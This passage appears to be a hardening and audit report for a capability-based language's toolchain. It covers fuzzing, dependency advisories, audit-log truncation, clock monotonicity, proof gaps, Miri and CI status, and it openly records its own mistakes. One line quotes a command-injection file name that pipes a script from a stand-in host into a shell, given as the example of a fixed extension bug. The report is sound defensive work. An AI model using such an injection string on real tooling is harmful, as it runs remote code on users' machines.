**The grammar IS the coverage.** A generator that cannot express the dangerous shape is not testing
for it, however many iterations it runs.

`crates/delulu-fuzz/src/danger.rs` adds parameterised families over exactly the shapes that have
broken the language — higher-order builtins with effectful closures, bare type parameters reaching
`List.map` **and** `Secret.map` (C88 had a twin), row-polymorphic `apply`, closures capturing
capabilities, nested higher-order calls, and the `Secret.map`+`verify` oracle. Parameterised, not
templated: effect sets, declared rows and nesting all vary, and one third of draws deliberately
under-declare a row so the rejection path is exercised too.

### Result

```text
$ delulu-fuzz 250000 20260803
generated=250000 accepted=160694 rejected=89306 unexpected_rejections=0 check_only=9024
SOUND: no trace escaped its row across 151670 executed programs
       (9024 more were accept/reject-checked only, never run).
```

`unexpected_rejections=0` means every program the generator predicted would be accepted **was**,
and every predicted rejection **was** — the predictions and the checker agree exactly.

**Two tests keep the generator honest**, because a generator that has silently stopped generating is
indistinguishable from one that finds nothing: `every_danger_family_is_actually_generated` asserts
each family appears in 4,000 draws and that the C88 shape is predicted `DL0401`, and
`the_danger_grammar_covers_what_the_original_could_not` asserts the corpus actually contains `[T]`,
`[e]`, closures, `.map(`, `.verify(`, `.expose(` and `if`.

### Honest limits

- **`Secret` families are check-only.** The harness grants console/clock/rand, not secrets, so those
  programs are accept/reject-checked but **never executed** — no trace is verified for them. The
  report counts them separately (`check_only=`) so `accepted` is never mistaken for "traces
  verified".
- **Three effects.** `Write`, `Clock`, `Rand` — the ones the harness can grant and run safely.
  `Net`, `Actuate`, `ForeignCall` are not generated.
- **No packages, plugins, actors, or foreign calls.** Single-module programs only.
- **Finding nothing is not proof.** It is now evidence over a grammar that *contains* the historical
  failures, which is strictly more than before — and strictly less than a proof.

## 8. Supply chain and engine hardening (P17-F)

### The gate that did not exist

`cargo deny check advisories` had **never been run**. There was no `deny.toml`, and nothing in CI,
the test suite, or any script checked the dependency tree against RustSec. The first run reported
**19 vulnerabilities and 2 unmaintained crates**.

**The CVEs are the symptom; the absent gate is the defect** — it is what let them accumulate
silently. `deny.toml` now exists and runs all four checks.

### Triage, by reachability rather than by count

"19 CVEs" is a number that panics rather than informs. Each was traced against what this project
actually compiles:

| Class | Count | Reachable? |
|---|---|---|
| Winch backend | 4 | **No** — `host.rs:16-31` pins Cranelift for every module |
| Component model | 4 | **No** — core wasm only, and now refused in `Config` |
| WASI | 3 | **No** — `wasi_snapshot_preview1` imports are DL1505 (`dpx.rs`) |
| Pooling allocator | 1 | **No** — `Config::new()` uses the on-demand allocator |
| SIMD / shared memory | 2 | **No** — codegen emits no `v128`; threads deferred |
| **aarch64 Cranelift sandbox escape** | 1 | **YES on ARM** — never executed here, but the project ships source |
| **Stores mix type indices between engines** | 1 | **Possibly** — this crate builds several `Engine`s |
| **pyo3** | 2 | **YES** — `python` is a *default* feature |
| Unmaintained (fxhash, paste) | 2 | transitive via wasmtime; no fix without a major bump |

Every ignore in `deny.toml` carries a falsifiable reason. The four reachable ones are **deliberately
not ignored**, so `advisories` is currently **RED** — a gate that were green because its failures
were silenced would be worse than no gate.

**Fixed this pass:** RUSTSEC-2026-0204 (crossbeam-epoch invalid pointer deref), 0.9.18 → 0.9.20,
semver-compatible, no code change.

### Turning "we do not emit it" into "the engine refuses it"

`host.rs` already argued that `cranelift_opt_level` should be pinned **explicitly** rather than
inherited, so it "cannot silently change if a future wasmtime default does". That argument was never
applied to the *feature set*, which is the larger surface: `Config::new()` left SIMD, threads,
memory64 and the component model at wasmtime's defaults, so the engine **accepted** modules using
them even though codegen emits none — and the engine also runs `.dwx` plugin artifacts, which arrive
as bytes rather than being compiled here.

`harden_wasm_features` now disables all four, on the Stage-3 engine **and** the plugin store.
`hardened_engine_refuses_a_simd_module` proves the narrowing takes effect rather than being silently
dropped by `Engine::new(...).unwrap_or_default()` — and it asserts a **control first**, that a stock
engine *accepts* the same module, so the refusal is provably ours and not a malformed fixture.

### Secret zeroization was eliminable

`SecretVal::drop` zeroed its bytes with a plain `*b = 0` loop. **A non-volatile store to memory that
is never read again is a dead store, and the allocation is freed immediately after** — LLVM is
entitled to delete the whole loop, leaving the secret in the freed heap block. The comment said
"best-effort"; the effort could have been zero, and nothing in the build would have said so. This is
exactly why the `zeroize` crate exists.

Now `write_volatile` plus a `compiler_fence`, using `std` alone (no new dependency). Stated limit,
because zeroization bounds exposure rather than eliminating it: this zeroes the **current**
allocation only — an earlier buffer left behind by a `String` reallocation, or a copy made by
`reveal`, is not reachable from `Drop` and is not zeroed.

### The CLI sweep is a script now

`CROSS_PLATFORM_VERIFICATION.md` has recorded a "CLI + compiler sweep 21/21" for several passes,
performed **by hand each time** — the kind of hand-maintained procedure this project's own design
rule 1 says will drift. It is now `scripts/cli-sweep.sh`: 22 cases over check / authority / why /
run / `--assert-trace` / fmt / new / test / explain / help / completions / doctor, each asserting an
exact exit code, reproducible by anyone on any platform.

**Writing it caught two of my own errors, both times because the project was right and I was not:**
an early draft passed `true` to the runner for two package cases, so they passed unconditionally —
a check that cannot fail is not a check; and it used bare `delulu test` where the scaffold's own
next-steps message prints `delulu test .`, which works. `new.rs` had already documented why, and a
test named `the_generated_package_does_what_the_message_promises` already executed every printed
command.

**Two further conclusions I drew and had to withdraw**, recorded because deleting them would be the
dishonest move: that `crates/delulu` being publishable-but-unpublishable was a defect (it is a
deliberate, tested premise of `INSTALL.md` §3, pinned from both sides by `tests/distribution.rs`),
and that `delulu new` fails the README's "already checks, tests and runs" claim (it does not).
What *was* real: twelve manifests carried a comment asserting "`cargo install delulu` works", which
contradicts `INSTALL.md` §3 and is false — corrected after verifying the failure with
`cargo publish --dry-run`.

### Miri — RAN, DID NOT FINISH. Not a pass.

**Stated plainly because the temptation is to round this up.** Miri was started on `delulu-check`,
`delulu-syntax` and `delulu-diag` under a 50-minute cap and was **killed by the timeout partway
through**. Every test it reached reported `ok` and it found no undefined behaviour — but there is no
`test result:` summary line, so the run is **incomplete** and does not license the sentence "Miri
passes". It needs a re-run with a longer budget.

Two structural facts about what Miri could ever tell us here, which matter more than the run:

- The crates Miri **can** run — `delulu-diag`, `delulu-syntax`, `delulu-check`, `delulu-broker`,
  `delulu-atlas` — contain **no `unsafe` at all**.
- The crates that **do** contain `unsafe` are precisely the ones Miri **cannot** run:
  `broker_transport.rs` (28 sites — named pipes and Unix sockets), `foreign.rs` (11 — libffi),
  `foreign_worker.rs` (6). Miri cannot execute FFI or real OS handles.

So even a completed run would cover the compiler front end while **the `unsafe` lives in the host
boundary**. That is an honest limit of the tool for this codebase, not a clean bill of health, and
the host boundary needs a different technique (sanitizers on a Linux runner, or targeted review).

## 9. Cryptography audit (P17-7)

### What is genuinely well done, stated first

- **Domain separation is present, deliberate and tested.** `GRANT_CTX = b"delulu-grant-v1"` and
  `RECEIPT_CTX = b"delulu-receipt-v1"` prefix the signed bytes (`cert.rs:69-71, 422-424`), with
  tests pinning that a receipt signature cannot be replayed as a grant, and that neither can be
  replayed as an artifact signature. This is the thing most projects get wrong and this one does not.
- **Canonical JSON is genuinely canonical** — keys sorted recursively (`audit.rs:663-677`), so the
  signed encoding does not depend on map iteration order.
- **Omit-when-empty is injective.** `to_json` drops `device` when empty and `body_value` drops
  `uplink_ttl_ms` when `None`. Absent ⟺ empty/None is uniquely recoverable, so no two logical values
  collide through that route. (The *other* direction — one logical authority, two encodings — is
  finding F3, already recorded.)

### ✅ P17-C1 — the audit chain did not detect TRUNCATION — **FIXED**

`audit::verify` walks forward from `GENESIS_HASH`, checking each record's `prev_hash` against the
running head and recomputing its hash (`audit.rs:354-396`). **Every check is local to a link.**
Deleting the last *k* records leaves every remaining link correct, so `verify` returns `Ok` — with
a smaller count and an earlier head.

**Nothing anchors the head.** `AuditLog::open` *recovers* it by reading the existing day files
(`audit.rs:216-227`), so after a truncation the broker resumes chaining from the truncated head and
every later record is genuinely valid. A search of the workspace for any stored head or record-count
expectation returns nothing.

Observed, with a control, in `crates/delulu-broker/tests/audit_truncation.rs`: five records written,
last two deleted, `verify` still `Ok` at three records — while an **in-place edit is caught**, which
is what the chain genuinely provides.

**THE FIX.** `ANCHOR.json` now records the head hash and the record count **outside the log**,
refreshed on every append. `verify` compares the chain it computed against it, and `AuditLog::open`
**refuses to start** on a log that disagrees with its own anchor — silently re-anchoring would erase
the evidence the anchor exists to keep, and would let the broker resume chaining from a shortened
head so that every later record was genuinely valid.

**What it buys, and what it does not — because an anchor is easy to oversell.** The anchor lives in
the same directory as the log, so **an attacker who can delete records can also rewrite the anchor.**
This is not tamper-proofing. It closes **accidental** truncation (partial write, full disk, botched
rotation, half-done sync — an ordinary operational failure that used to pass silently) and **naive**
tampering, and it makes the head **exportable**, which is the only route to genuine tamper-evidence:
an operator can witness it elsewhere and check a later run against a value the attacker never held.
That requires an **external** witness, which no file inside the directory can be.

`an_attacker_who_also_rewrites_the_anchor_is_not_caught` pins that limit as a passing test, so the
boundary is stated in code rather than only in prose.

### 🔶 P17-C2 — the `device` dimension has two sources of truth (OBSERVED, latent)

`Scopes::device` is a `BTreeMap<String, DeviceScope>` whose value carries its own `device: String`.
**Authorization reads the key; the signed bytes read the field.**

| Reads the KEY | Reads the VALUE's `.device` |
|---|---|
| `all_within` — the `⊑` check (`device_scope.rs:276`) | `Authority::to_json` (`authority.rs:78`) |
| `grants_device` — Actuate enforcement (`device_scope.rs:302`) | `render_compact` (`authority.rs:103`) |
| `intersect_device_sets` — the meet (`device_scope.rs:285`) | — and so certificate signatures and the audit record |

Nothing enforces `key == value.device`. Observed in
`crates/delulu-broker/tests/device_identity.rs`: a map keyed `sat0/safe` holding a scope describing
`sat0/arm` makes `grants_device("sat0/safe")` true while `to_json` emits `sat0/arm` — the broker
would enforce one device and attest another.

**NOT exploitable from outside the process, and not claimed to be.** `cert::authority_from_json`
re-keys on `d.device` (`cert.rs:286`), so every certificate, audit record and `--json` payload
repairs the invariant on load. This is a *latent* second source of truth in the exact shape design
rule 1 warns about — a future construction site that keys it wrongly would split enforcement from
attestation silently. A third test pins the re-keying, so if that ever stops holding the finding
becomes reachable and the test says so.

## 10. Capability algebra and the theorem sketches (P17-7 continued)

### ✅ P17-B1 — the grant tree never persists, so there is no deserialization vector

Deserialization is the classic escalation vector, so the question was whether the `⊑` invariant is
re-established when broker state is loaded, or merely assumed from the file. **The question does not
arise: the grant tree is never written to disk.** `Broker` holds `nodes: HashMap<GrantId, Node>` in
memory; a search of `delulu-broker` for tree persistence finds none. What *does* persist is the
guard policy, the audit chain and `broker.key` — not grants.

**This is a genuinely strong property and is recorded as one.** No file can be hand-edited to give a
child more authority than its parent, because no file describes the tree. Every node in a running
broker was created through `attenuate_core`, which performs the `⊑` check.

The consequence to state honestly: **a daemon restart drops every grant.** That is fail-closed and
coherent — authority is re-established by adopting a signed certificate — but it means grants are
session-scoped in a way an operator should know.

### ✅ P17-B2 — expiry was judged against a WALL clock — **FIXED**

`time.rs:14-25`: the production `ClockSource` is `SystemTime::now()`. `effective_state` compares a
node's absolute deadline against that reading. **A wall clock is not monotonic.**

Observed in `crates/delulu-broker/tests/clock_monotonicity.rs`: a grant with a deadline at
t=5,000 reports `Live` at t=1,000, `Expired` at t=9,000, and **`Live` again after the clock is set
back to t=2,000** — with no revocation, no audit event, and nothing recording that authority was
restored. A control confirms expiry *is* permanent while time only moves forward.

**Why this matters for the stated users rather than being a curiosity:** the target domains are
satellites, autonomous aircraft and robots, and on exactly those platforms a backwards step is
**routine, not adversarial** — GNSS time acquisition after a cold start, an NTP correction after
drift, an RTC read at power-on. The uplink lease sharpens it further: RFC 0001 F4 exists to be *the
bound that survives a partition*, because revocation cannot cross one — and that bound is a
wall-clock deadline.

Not claimed: that an attacker can set your clock (usually privileged). The finding was that the
guarantee **rested on clock monotonicity, an assumption the design never stated**. Ruling D20 had
already moved the simulator's dead-man onto a logical clock for this class of reason; broker expiry
had not had the same treatment.

**THE FIX — a ratchet, not a monotonic clock.** `Broker::now` takes the running maximum of every
reading it has ever taken. `Instant` was not an option: certificate `not_before`/`not_after` are
**signed absolute epoch-millis**, so the comparison must stay wall-clock-comparable or a certificate
minted by the ground could not be evaluated at all. The ratchet keeps it comparable while making it
non-decreasing — a forward jump is accepted and advances it, a backward jump is clamped, and **what
expired stays expired**.

**It can only ever withhold authority, never grant it**: clamping upward can expire something early
but can never un-expire anything. `the_ratchet_only_ever_withholds_authority_never_grants_it` pins
that direction as a test.

**Residue, stated:** the ratchet guarantees monotonicity, not *accuracy* — a clock set back and
forward again still measures the interval differently from wall time. And it is per-broker state
held in memory, so a restart begins afresh; that is sound only because the grant tree does not
persist either (P17-B1), so every node a restarted broker holds was created after the restart.

### 🔴 P17-T1 — the core calculus does not model the construct that broke (mechanization target changed)

`DELULU_CORE.md` §9 records a Lean/Coq formalization of §1–§7 as the project's mechanization target.
**Mechanizing it as written would not have caught C88.**

Searching the entire document for `higher-order`, `callback`, `invoke`, `R-4` or `map` returns
**zero occurrences**. The calculus's `Σ` assigns each `op_ℓ[R]` argument types and a *single* emitted
label, and `E-Op` (§4) reduces in one step emitting exactly that label. **There is no construct for a
primitive that invokes a function argument.** `T-Op` computes its row as `{ℓ} ⊔ ρ₀ ⊔ ⊔ᵢ ρᵢ` — the
union of the op's own label and the rows of *evaluating* its arguments, which for a lambda is `{}`,
because T-Abs makes closure construction pure. A callback's **latent** row never enters the rule.

So Theorem 3 would be provable *and true of the calculus* while the implementation stayed unsound —
the calculus is simply **silent** about the construct that failed. `SOUNDNESS_AUDIT.md` F-4 knows
about higher-order builtins; the calculus does not.

**This changes what Phase 9 must target.** A Lean development of §1–§7 as written would prove the
wrong theorem. The calculus must first be extended with a higher-order primitive form — an `op`
whose argument is a function it invokes, with `E-Op` emitting the callback's labels too — or the
mechanization buys confidence in a model that excludes the only soundness hole this project has had.

### 🔶 P17-T2 — Theorem 1 (Progress) is FALSE as stated (OBSERVED)

`E-Op` (§4) carries `(scope of κ permits the arguments)` as a **premise**. When a capability is
present and well-typed but its *scope* does not cover the argument, `E-Op` does not apply and no
other rule does — so a well-typed closed term is **stuck**, which Progress forbids.

Observed: a program granted `fs.read=./data` that reads `../outside.txt` **checks clean** and then
faults at run time with `DL0904: path ... escapes the granted scope`. The implementation has a third
outcome — a **fault** — and the calculus has no such configuration (`DELULU_CORE.md` contains no
`fault` at all).

The sketch's own justification does not cover this: it argues *"No stuck state arises from a missing
capability, because a missing capability makes the term ill-typed, not stuck."* That addresses a
**missing** capability. A **present** capability with insufficient scope is a different case, and it
is the one the runtime actually raises. Types do not track scopes — scopes are runtime values.

The correct statement is **progress-or-fault**: a well-typed term is a value, steps, or is a fault
configuration. That is a small repair to the theorem and a real one to the development, since the
fault configuration has to exist before Preservation can be stated over it.

## 11. Concurrency and actors (P17-7, domain c) — mostly good news

### ✅ Capabilities DO cross actor boundaries, and that is sound

The question was sharp: if capabilities are first-class values and actors exchange values, then
message passing **is** delegation and must satisfy `⊑`. Measured, by writing and running the
programs:

| Case | Verdict |
|---|---|
| `be say(out: Cap[Console], …)` — no annotation | **accepted**, runs |
| `be say(out: val Cap[Console], …)` | **accepted**, runs |
| `be say(out: tag Cap[Console], …)` | accepted |
| `be say(out: iso Cap[Console], …)` | refused, **DL1601** |
| `be take(r: val Root)` — the whole root authority | **accepted**, runs |
| a capability stored in actor `var` state, used by a later behaviour | **accepted**, runs |

So authority does travel in messages. **This is not an escalation, and the reason is structural:
you can only send a capability you already hold, and capabilities are unforgeable** (`value.rs`'s
`CapVal` has no constructor from data — broker-only minting). Message passing therefore *shares*
authority; it cannot widen it, so there is no `⊑` obligation to check. The `⊑` check belongs where
authority is *minted*, and that is where it is.

**The accounting stays honest, which is the part that actually had to be verified.** Running each
accepted case, `delulu authority` reports `effects: Async, Write` and `capabilities: Console stdio`
— including the case where an actor holds `Root` and derives a console from it *inside* the actor.
The static analysis follows the capability across the boundary rather than losing it there.

### ✅ The actor runtime contains no `unsafe` at all — by construction

`actors.rs` matches on "unsafe" only in comments explaining why there is none. The topology earns
it: actors are **worker-owned** (pinned at spawn, never migrating), `Value` is `Rc`-based and
deliberately not `Send`, and messages cross only as `MsgValue`, an owned `Send`-by-construction
representation. Data races are impossible by construction rather than by discipline — and the
per-sender-pair FIFO guarantee falls out of `mpsc` rather than being asserted.

### 🔶 P17-T3 — the calculus's §6 faithfulness claim is weaker than stated

`DELULU_CORE.md` §6 justifies its exclusions on the grounds that each "is a Stage-1/2 language
restriction already enforced, so the calculus faithfully models the implemented language rather than
an idealized superset". One of those exclusions is:

> **No mutable module state.** The store `σ` holds only capability tokens; there is no ambient
> mutable cell through which a capability could launder.

**Actor `var` state is exactly such a cell, and it can hold a capability** — observed above. The
document mentions "actor" **zero times**. So the exclusion is true of *modules* and false of
*actors*, and the calculus models neither actors nor the cell.

Consistent with **P17-T1**, and the same shape: the calculus is not wrong, it is *silent*, and its
own §6 argues faithfulness on the strength of exclusions that the surface language has since grown
past. A mechanization must either model actors or state explicitly that actor state is outside the
development — the one thing it must not do is inherit §6's faithfulness claim unexamined.

**No dishonesty in the tooling:** the effect rows and the authority report handled every case
correctly. This is a gap between the *paper model* and the *language*, not between the language and
its own report.

## 12. Category 1 → the authority order, proved symbolically across all nine dimensions (P17-8)

`docs/design/models/authority_algebra.py`, Z3. **17 obligations, all discharged.**

Phase A proved reflexivity and transitivity over an *abstract* partial order and checked the path
dimension exhaustively. This proves the conjunction `attenuation_check` actually computes — seven
exact-set dimensions plus the device dimension, with the path dimensions represented by their set
laws:

- **Set dimensions:** reflexive, transitive, **antisymmetric**, meet is a lower bound, meet is the
  **greatest** lower bound, idempotent, commutative, associative.
- **Device dimension:** reflexive, transitive, meet is a lower bound, meet is the **GLB**, and
  antisymmetric on its fields — modelled faithfully to `within`/`meet` including the three
  asymmetries that are easy to invert (smaller heartbeat is *narrower*; smaller ttl is *narrower*;
  an **unbounded** rate under a **bounded** parent is a **widening**).
- **The full conjunction:** reflexive, transitive, **meet ⊑ both operands — the no-widening law,
  all nine dimensions simultaneously** — and meet is the GLB.

Proved means proved *for every value* of the modelled variables, not for a sampled corpus.

**This localises F1 precisely, which is the useful part.** Every dimension modelled here is
antisymmetric on its own representation. So the preorder finding is **not a property of the
algebra** — it is a property of the path dimension's *encoding*, where `./data` and `data` are
distinct `String`s denoting one path. Fixing F1 is therefore a **canonicalization** change, not an
algebra change, and the algebra needs no repair.

> **Correction, 2026-08-06 — this localisation was right about the algebra and incomplete about the
> encoding.** "Canonicalization" turned out to name *two* independent collapses, and the paragraph
> above only saw one. Normalizing spellings does not make `⊑` antisymmetric, because a path set
> carries a second redundancy the model could not express: `{"./data", "./data/sub"}` and
> `{"./data"}` are mutually `⊑` while differing as sets, since `./data/sub` is already inside
> `./data`. **The model missed this because it abstracts each dimension as a set over an opaque
> element type with an uninterpreted `within` — so it cannot represent one element of a set
> subsuming another.** The true canonical form is an **antichain** of canonical spellings. The
> conclusion "the algebra needs no repair" stands and was confirmed; the estimate of what the fix
> required did not. Recorded because a model's silence is only as strong as what it was able to say,
> and this is a concrete case of that boundary being load-bearing.

**One obligation was deleted rather than kept.** An earlier draft's "NO WIDENING" line was encoded
as `Implies(False, True)` — vacuously true. Z3 discharged it and printed `PROVED` while checking
nothing. **A vacuous obligation reported as proved is worse than a missing one**, because this list
is the evidence. It is gone, the reason is in the source, and the genuine statement is the
lower-bound obligation.

**Limits, stated:** set dimensions are bit-vectors of width 4 (all subsets of a 4-element universe);
the device model carries two envelope dimensions rather than arbitrarily many — the laws are uniform
in that number, but the uniformity is an argument, not something Z3 checked. And **nothing here
proves the Rust implements this model**; that link is the `file:line` citations above each
definition, maintained by hand.

## 13. Category 2 (machine checked) — no longer empty, and narrowly so

`docs/design/models/lean/DeluluCore.lean`, **Lean 4.32.2, no `sorry`**. Deliberately *not* a
mechanization of `DELULU_CORE.md` §1–§7 as written — P17-T1 showed that would prove the wrong
theorem. It formalises the **extension** the calculus needs and proves both directions:

- **`good_sound`** — with the corrected rule, every emitted label is in the declared row.
- **`bad_unsound`** — with the rule the document states, **a well-typed program's trace escapes its
  row**: `ho (lam [write] (op write))` types at `[]` and emits `write`. **C88, mechanized.**
- **`c88_good_row_contains_write`** — the corrected rule refuses that program an empty row.

**The check that cannot be talked around.** A `sorry` proof still type-checks; it cannot hide from
`#print axioms`, which runs in the file itself:

```text
'DeluluCore.good_sound' does not depend on any axioms
'DeluluCore.bad_unsound' does not depend on any axioms
'DeluluCore.c88_good_row_contains_write' does not depend on any axioms
```

Not `sorryAx` — and not even `propext` / `Classical.choice` / `Quot.sound`. Fully constructive.

**Scope:** the higher-order fragment ONLY. No capabilities, no store, no secrets, no attenuation,
no Progress, no Preservation. It settles the one question that cost this project its worst
soundness hole, and nothing else. `MATHEMATICS.md` category 2 now reads "non-empty, but narrowly"
rather than "empty", and says exactly which parts remain unmechanized.

## 14. CI — prepared, never executed

`.github/workflows/ci.yml` carries every campaign gate: the CLI sweep, the fuzz campaign,
`cargo deny`, both TLA+ models, **all three teeth tests** (each fails the build if TLC *succeeds*),
the Z3 algebra and the Lean development. The YAML validates locally — 3 jobs, 28 steps — and every
command has been run by hand here.

**It has never run on a runner, because this repository is not pushed.** "Prepared" and "green" are
different claims. `cargo deny check advisories` is deliberately `continue-on-error`: four advisories
are reachable and are not silenced, and reporting them without blocking is the honest arrangement.

## 15. Method note — why exhaustive enumeration replaced spot-checks

`authority.rs`'s own test carried the comment *"Property spot-check"* over a single pair. A
spot-check cannot distinguish "this law holds" from "this law holds for the pair I thought of."
Every law in F1–F3 was already covered by a passing hand-written test; all three failed the moment
the input space contained something a human would not have written — two spellings of the same path.
The lesson generalizes and is the campaign's working rule:

> **Do not write examples. Generate inputs.** A test whose inputs a human chose can only find
> defects that human anticipated.

**The rule caught the campaign's own analysis a second time, while F1 was being closed.** The Z3
model had localised F1 to distinct spellings of one path, and canonicalizing spellings is the fix
that localisation implies. Written that way, the antisymmetry test **still failed** — because a
path set has a second redundancy (an element already inside another) that the model's abstract
`within` could not express. The counterexample `{"./data", "./data/sub"} ≡ {"./data"}` was produced
by the generator, not by re-reading the model. A proof about an abstraction is exactly as strong as
the abstraction's ability to state the property, and the enumerator is what notices when it cannot.

---

## 16. P18 — closing the open findings (2026-08-06)

Owner instruction: *"The goal is no longer adding features. The goal is eliminating uncertainty."*
This section records what closed, what did **not**, and the two places where a check that had been
written to prove something turned out to prove nothing.

### Closed

| Finding | How | Evidence |
|---|---|---|
| **F1** `⊑` a preorder | canonical representatives at the custody boundary | `the_order_is_antisymmetric_on_canonical_representatives`, with a written proof |
| **F2** `⊓` asymmetric | the meet emits representatives | `the_meet_is_symmetric_as_the_comment_claims`, un-`#[ignore]`d |
| **F3** divergent hashes | equivalent authorities are now literally equal | `equivalent_authorities_serialize_identically`, un-`#[ignore]`d |

`order_laws.rs` went from **6 passed / 3 ignored-and-failing** to **9 passed / 0 ignored**.

### Two checks that could not fail, both found by falsifying rather than by reading

This is the campaign's own rule (*a gate that cannot fail is not a gate*) catching work done **under
the rule**, which is why both are recorded rather than quietly fixed.

1. **`verify-package.js` passed a `.vsix` that was genuinely broken.** It walked only the relative
   requires reachable from the entry point, so it saw `vscode-languageclient` was present and
   stopped — never reaching that *the client's own files* require three packages that had not been
   packaged. A check that stops at the first hop cannot find a missing second hop. It now scans every
   shipped `.js`, and against the broken archive it names all three.
2. **The 1000-agent stress test asserted "every stored authority is canonical" vacuously.** It built
   authorities with `Authority::new`, which canonicalizes — so the broker never received a raw
   spelling. **Deleting all three canonicalization calls from `tree.rs` left all seven scales
   passing.** It now constructs by struct literal, and the same deletion fails all seven, each naming
   the exact spelling that reached storage.

The general shape: *both checks tested the thing that was already true on the way in, not the thing
the system was supposed to do.* Neither would have been found by re-reading the code.

### Also closed

- **The VS Code extension had a command injection.** The run and test lenses built a shell command
  *string* from the open file's path, so a file named `x;curl evil.sh|sh.delulu` executed on click —
  and any path containing a space already ran the wrong command. Two further defects sat beside it:
  the `authority: {…}` lens had been emitted by the server since Stage 8 with **no client registering
  it** (clicking raised *"command not found"*), and "▶ run test" ignored the test name and ran the
  whole file. `editor_contract.rs` now compares the three command lists and pins the argv-vector
  execution shape; each of its gates was checked by reintroducing the exact defect.
- **The two deliberately-`#[ignore]`d slow gates were executed** rather than left as standing
  intentions: the WASM two-engine differential over **50,000 programs** (683 s, 0 divergences) and
  the formatter's 100,000-program law gate (853 s, 0 failures).
- **Miri now completes — 192 tests across three crates, zero undefined behaviour.** It had been
  started twice before and finished neither time; an unfinished run is not a pass. Run **per crate**:
  `delulu-diag` 45 passed (54 s), **`delulu-broker` 129 passed (1583 s)**, `delulu-atlas` 18 passed
  (342 s). `-Zmiri-disable-isolation` is required, and the flag matters: without it Miri aborts on
  `create_dir_all` with *"unsupported operation"*, which is a Miri limitation and **not a finding** —
  an earlier pass had recorded that abort as though it were one. The honest limit is unchanged: the
  crates Miri can run hold **no `unsafe` at all**, and the three that do are exactly the ones it
  cannot execute, so "0 UB" is a result about the code least likely to contain any.
- **CI gained the jobs it was missing**: Miri, ARM64 Linux, clippy/rustfmt as gates, and a job that
  builds the extension and verifies the built `.vsix` would activate. It **still has never executed.**
- **macOS cross-checking was widened and one earlier reading corrected**: seven crates clean for
  `x86_64-apple-darwin`, and Apple Silicon is *not* entirely uncheckable — three crates compile clean
  for `aarch64-apple-darwin`. See `CROSS_PLATFORM_VERIFICATION.md`.

### `HARDENING_CAMPAIGN.md` advertised eight defects that were already fixed

The README points a reader at that file for *"what is currently known to be wrong with all of this"*.
It disagreed with itself: **eight section headings said `— OPEN` while the summary table in the same
file recorded each as CLOSED with a ruling number** — C2 (D38), C4/C5/C6/C8 (D25), C15 (D41),
C16 (D47a), and C21 (D51, then D67, then D68).

C21 is the sharpest case, because the *code* had known for longer than the document did:
`interp.rs`'s own comment reads *"C21 was filed as a library-embedding hazard and D51 closed it"*,
and the file goes on to describe two further hardenings. A reader scanning headings would have
concluded the interpreter still SIGSEGVs on small stacks. A reader who checked the table would have
concluded the opposite. Both were reading the same file.

This is C22's defect wearing different clothes — *"two documents in the same tree disagreed about
whether a feature exists, and the code sided with the more pessimistic one"* — except here the two
disagreeing documents are two parts of **one** document. Headings now match the table, each with the
ruling that closed it; the analysis under each heading is left as filed, because the finding as
originally written is the thing worth keeping.

**Three headings still say OPEN, correctly:** C46 and C28 are *owner-reserved* — they are decisions
for the owner, not defects for an agent to close — and C92 (the broker is single-tenant) is a named,
deliberate limitation rather than a bug.

### How far the extension was actually verified — and where that stops

Stated precisely, because "production-ready" is the kind of phrase that absorbs more than it earned:

| Step | Status |
|---|---|
| Bundles and packages (`npm run package`) | **verified** — 9 files, 90.9 KB |
| Every `require` in every shipped file resolves (`npm run verify`) | **verified** — and the check was falsified against a deliberately broken `.vsix` |
| Commands the server emits = registers = declares | **verified** — `editor_contract.rs`, each gate falsified |
| No path reaches a shell as a command string | **verified** — falsified by reintroducing `sendText` |
| Installs into a real VS Code | **verified** — `code --install-extension` succeeded; `--list-extensions` reports `delulu-lang.delulu-lang@1.0.0` |
| **Activates and serves a live `.delulu` buffer** | **NOT verified** — no editor session was driven, so nothing here proves the LSP client connects, that the lenses render, or that clicking one does what it now says it does |

The last row is the honest boundary. Everything above it is mechanical and was checked; activation
needs a live editor session and was not performed.

### Attacking the F1/F2/F3 conclusion rather than restating it

"Canonicalization happens at the custody boundary" is only worth as much as the enumeration behind
it, so the boundary was enumerated instead of asserted:

- **Exactly two sites insert into the node map** — `tree.rs:416` (in `issue`) and `tree.rs:519` (in
  `attenuate_core`). Both canonicalize.
- **Certificate adoption does not bypass them.** `cert.rs:569` routes through `Broker::issue`, so a
  federated grant arriving over the wire is canonicalized like any local one.
- **`Node.authority` is write-once.** The three sites that mutate an existing node touch
  `ttl_millis`, `holder.peer` and `state` — never the authority. The only `.authority =` assignment
  anywhere in the crate is inside a *test* that tampers with a certificate on purpose.

So "every authority in the tree is canonical" is **structural**, not a property that happens to hold
today: there is no third way for one to get in, and no way to change one after it is in. The
1000-agent stress test then checks the conclusion at scale, and fails all seven scales if any of the
three canonicalization calls is removed.

### The distributable was actually built, unpacked, and used

"Deployable" had never been checked end-to-end in this pass, so it was:

1. `scripts/package-toolchain.sh` → release build (5m14s) → `dist/delulu-1.0.0-x86_64-pc-windows-msvc.tar.gz`, 21 files.
2. `sha256sum -c` on the published checksum → **OK**.
3. Unpacked into a directory with no repository and no Rust toolchain.
4. `./bin/delulu --version` → `delulu 1.0.0`; the shipped `examples/demo.delulu` **checks clean**.
5. From an empty directory, using *only* the unpacked binary: `delulu new demo2` then
   `delulu run . --grant console` → **`hello, world`**, exit 0.

The fresh-user path in `README.md` was run the same way and behaves as documented, including the
refusal: `delulu run .` without `--grant console` **exits 1** with `DL0703`, and with the grant exits
0. That distinction was checked with a real exit code — an earlier reading of it was `tail`'s status,
not the program's, which would have made a refusal look like a success.

### Not closed, and not softened

- **Zero macOS executions.** Type-checking is not running.
- **CI has never run.** The repository is not pushed. "Prepared" ≠ "green".
- **F4** — no principal types; swapping two parameters still decides compilation.
- **IF-1 residue** — `verify` declassifies without requiring `Cap[Declassify]`.
- **Audit truncation** is anchored, not proof against an attacker who rewrites the anchor too.
- **The clock ratchet gives monotonicity, not accuracy**, and is per-broker in-memory state.
- **F1/F2/F3's fix is format-affecting and shipped without an RFC**, which this document had
  previously said it would not do. That is an owner decision, recorded as a deviation.
- **No cargo-fuzz targets.** `delulu-fuzz` is a standalone generator binary, not a `fuzz_targets/`
  tree, so there is no coverage-guided fuzzing and no corpus that persists between runs.

### A claim I made in this pass that was wrong

Commit `7e9c5a3`'s message says *"no benchmark suite exists"*. **That is false**, and the correction
belongs here rather than in a message that cannot be edited. `measurements/` is a full measurement
program — fifteen studies, a binding `METHODOLOGY.md`, and a `delulu-measure` binary that regenerates
